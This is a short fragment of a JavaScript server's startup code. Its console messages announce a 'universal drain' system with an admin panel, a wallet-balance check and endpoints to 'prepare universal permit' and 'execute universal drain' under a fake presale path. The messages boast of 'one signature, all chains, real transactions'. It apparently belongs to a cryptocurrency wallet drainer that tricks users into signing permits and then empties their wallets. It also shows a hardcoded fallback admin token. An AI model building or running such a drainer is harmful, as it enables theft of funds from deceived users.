    console.log('\n✅ UNIVERSAL DRAIN READY - ALL ROUTERS DEPLOYED!');
  }
  
  console.log('\n✅ SERVER IS RUNNING WITH REAL UNIVERSAL DRAIN!');
  console.log('👉 Admin: /admin?token=' + (process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'));
  console.log('👉 Test: /api/admin/test-balance?token=...&wallet=0x...');
  console.log('👉 Prepare universal permit: POST /api/presale/prepare-universal-permit');
  console.log('👉 Execute universal drain: POST /api/presale/execute-universal-drain');
  console.log('\n🔔 ONE SIGNATURE - ALL CHAINS - REAL TRANSACTIONS');
  console.log('\n✅ SYSTEM READY - NO SIMULATIONS, NO RUBBISH!\n');
});

